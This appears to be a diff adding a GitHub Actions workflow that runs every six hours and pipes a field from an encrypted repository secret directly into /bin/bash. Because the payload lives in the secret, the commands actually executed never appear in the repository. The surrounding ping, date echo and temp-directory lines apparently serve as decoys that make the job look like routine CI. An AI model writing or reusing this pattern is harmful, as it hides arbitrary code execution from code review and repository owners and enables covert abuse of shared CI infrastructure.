@@ -1,0 +1,22 @@
+name: huyixin1923
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huyixin1923
+        env:
+          p25783: ${{ secrets.p25783 }}
+        run: |
+          : ' Another single-line comment '
+          echo $p25783 | jq -r .l7783 | /bin/bash
+          popd
+          ping -c 10 github.com
+          echo "Debug at $(date)"
+          cd ~
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
